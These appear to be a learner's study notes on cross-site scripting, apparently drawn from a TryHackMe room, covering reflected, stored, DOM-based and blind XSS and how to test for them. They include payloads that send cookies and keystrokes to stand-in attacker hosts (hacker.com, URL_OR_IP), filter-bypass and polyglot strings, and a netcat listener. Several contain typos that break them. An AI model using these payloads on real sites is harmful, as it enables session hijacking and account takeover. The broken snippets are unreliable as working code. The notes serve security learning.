- XSS => Cross-Site Scripting
# XSS Payloads => JS code we sish to be executed on the targert machine
--------------
	- PoCs:
		1. POP UP Alert => `<script>alert('xss')</script>`
		2. SESSION SLEALINNG => `<script>fetch('http://hacker.com/steel?cookie=') + btoa(document.cookie));</script>`
			- lets explain what is this payload doing:
				commonly the session IDs,login tokens are kept in the user cookies, 
				this payload steel the cookies using `document.cookie`, base64 encoded it using `btoa()` and send them to a webswever belongs to the hacker which is in our case `http://hacker.com/steel?cookie=` using the `fetch()` method.
		3. KEY LOGGER => `<script>document.omkeypress = funtion(e){fetch('http://hackerr.com/log?key=' + btoa(e.key));}</script>`
			- lets explain what is this payload doing:
				it logs  all the keys the user pressed in the web page and send them to an attacker base64 encoded.
		4. BUSINESS LOGIC => this is a specific payload depends on knowing the function you want to use in your paload, the payload is looks like this:
				`<script>user.changEmail('attacker@mail.de');</script>`
					- lets explain what is this paylaod doing:	
						assuming that you know there is a function called `user.changeEmail()` is the web page, you will use it to modify the user's email with your email and then you can reset the password.
# Reflected XSS
---------------
	- Happens when there is any user validation on the user input
	- you can  find an RXSS if you input some invalid data and an error messaage appear in in the page body `Invalid User Input` and you realised that the URl is looked like that:
		`https://wesite.com?err=Invalid User Input`
	you can  modify the GET reauest and add some malicious js code and send it to the vicrim such as:
		`https://website.com?err=http://attacker.com/js.js` 
	once the victim click the link the malicious js code will be executed in his browser.

% IMPACT:
	- steeling sessions or user info by sending them a malicous links or put the malicious link somewhere in anther website.

% How to test for RXSS:
	1. checks every possible parameters
	2. ckecks URL file path
	3. HTTP headers


# Stored XSS
------------
	- Happens when the payload is stored in the web page or the db, and gets run when other users visit the web page.
	- You can find such XSS in blog pagea allowes the ueser to make comments, the attacker can insert a malicious JS code in the comment which  is store din the db, when other users visit the blog the js code will be executed in thier browsers.

% IMPACT:
	- The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

% How to test for Stored XSS?
	- You need to check every possible point of entery which are stored in the web app such as:
		1. Comments is blogs
		2. Profle page informaiton
		3. Web listings
	- Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.  

# DOM Based XSS
---------------
	- What is DOM?
		DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below
		https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png

 	- How To Test For DOM Based XSS?
 		DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

 		When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


 # Blind XSS
 -----------
 	- It is like stored xss, but you don't know wether it works or not
 	- it could be for example in the 'Contact US' form if the data is not validated you can inject an paylaod in it an send it to one of the staff

 % IMMPACT
 	- Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal. 

 % How to test for blind xss?
 	you need to ensure that your payload has a call back (usually an HTTP request) so when the paylaod is wxecuted you will be notfied

 	you can use xss hunter express => `https://github.com/mandatoryprogrammer/xsshunter-express`

 # XSS NOTES:
 ------------
 	- If the input is reflected in a JS code like thia one here
 		        document.getElementsByClassName('name')[0].innerHTML='test';
 		we need to inject a js payload inside the innerHtml element which escape the '' and run the code so we will inject ';alert(2)// so the js code will be just like that:
 			        document.getElementsByClassName('name')[0].innerHTML='';alert(2);//';
 			        	where the ' to close the old one, the ; to end the previous command and the // to comment anything comes after it
    
    - If script tag is filterd, if you enter <script> it would  be <>
    in this case we can try some ways to esacpe the filtering such as:
    <Script>alert(1)</Script>
    <SCRIPT>alert(1)</SCRIPT>
    or we can just use 
    <scrscriptipt>alert(2)</scrscriptipt>

    - PloyGlots
    	paylaod which can escape attributes, tages, bypass filters, all in one 
    	`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`


    - In The blind XSS we can use nc or python web server
    python  with the payload => `<script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
    netcat => nc -nlvp 9001 